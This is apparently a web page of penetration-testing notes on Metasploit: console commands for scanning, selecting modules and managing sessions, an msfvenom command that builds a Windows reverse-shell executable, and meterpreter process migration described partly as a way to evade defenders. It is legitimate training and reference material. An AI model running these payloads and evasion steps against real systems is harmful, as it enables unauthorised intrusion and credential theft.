@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Metasploit</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Metasploit</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#metasploit" id="toc-metasploit">Metasploit</a></li>
+<li><a href="#msfvenom" id="toc-msfvenom">msfvenom</a></li>
+<li><a href="#migrate-meterpreter" id="toc-migrate-meterpreter">Migrate (meterpreter)</a></li>
+</ul></div>
+  <hr>
+<h2 id="metasploit">Metasploit</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Start the database service &amp; create and initialize the MSF database</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msfdb</span> init</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Enable the database service</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl enable postgresql</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Verify database connectivity</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">db_status</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Create workspace</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">workspace</span> <span class="at">-a</span> target1</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Scan with nmap</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">db_nmap</span> <span class="at">-A</span> <span class="op">&lt;</span>TARGET1<span class="op">&gt;</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="co"># List of all discovered hosts up</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">hosts</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="co"># Display discovered services</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="ex">services</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="ex">services</span> <span class="at">-p</span> 5000 <span class="co"># specific port</span></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="co"># Search all SMB auxiliary modules</span></span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="ex">search</span> type:auxiliary smb</span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="ex">search</span> apache</span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a><span class="co"># Activate a module</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a><span class="ex">use</span> 5</span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="co"># Get information about the currently activated module</span></span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a><span class="ex">info</span></span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a><span class="co"># Display the options of a module</span></span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="ex">show</span> options</span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="co"># Get a list of all payloads that are compatible with the currently selected module</span></span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a><span class="ex">show</span> payloads</span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="co"># set &amp; unset an option</span></span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> <span class="op">&lt;</span>OPTION<span class="op">&gt;</span> <span class="op">&lt;</span>VALUE<span class="op">&gt;</span></span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a><span class="bu">unset</span> <span class="op">&lt;</span>OPTION<span class="op">&gt;</span></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a><span class="co"># Set a payload</span></span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> payload payload/linux/x64/shell_reverse_tcp</span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch a module</span></span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span></span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a><span class="co"># Show vulnerabilities that Metasploit automatically detected based on the results of the executed module</span></span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a><span class="ex">vulns</span></span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a><span class="co"># Show valid credentials we gathered</span></span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a><span class="ex">creds</span></span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a><span class="co"># Background session</span></span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a><span class="ex">CTRL</span> + Z</span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a><span class="co"># List all active sessions</span></span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a><span class="ex">sessions</span> <span class="at">-l</span></span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a><span class="co"># Interact with a session</span></span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a><span class="ex">sessions</span> <span class="at">-i</span> 2</span></code></pre></div>
+<hr />
+<h2 id="msfvenom">msfvenom</h2>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># List payloads</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-l</span> payloads <span class="at">--platform</span> windows <span class="at">--arch</span> x64</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Create payload</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> windows/x64/shell_reverse_tcp LHOST=<span class="op">&lt;</span>IP<span class="op">&gt;</span> LPORT=<span class="op">&lt;</span>LPORT<span class="op">&gt;</span> -f exe <span class="at">-o</span> file.exe</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: To handle a staged payload don’t use netcat. Use Metasploit’s <code>multi/handler</code> instead.</p>
+</blockquote>
+<hr />
+<h2 id="migrate-meterpreter">Migrate (meterpreter)</h2>
+<p>Reason to migrate: When a host is compromised, the Meterpreter payload runs inside the process used for exploitation.</p>
+<ul>
+<li><strong>Stability</strong>: If that process is closed, your access is lost</li>
+<li><strong>Avoid detection</strong>: The process name may also appear suspicious to defenders</li>
+<li><strong>Compatibility</strong>: The payload may be 64-bit, but the session is on an 86-bit OS</li>
+</ul>
+<p>To avoid this, we can use <code>migrate</code> to move the payload to a more stable or inconspicuous process.</p>
+<blockquote>
+<p><strong>Note</strong>: Migration is only allowed to processes with the same or lower integrity and privilege level.</p>
+</blockquote>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Show list process</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> ps</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Migrate</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> migrate 8052</span></code></pre></div>
+<p>If no suitable process is available for migration, we can use the execute command to create a new process and run the Meterpreter payload within it by specifying a desired command or program.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Create a hidden process</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> execute <span class="at">-H</span> <span class="at">-f</span> notepad</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Migrate</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> migrate 8052</span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
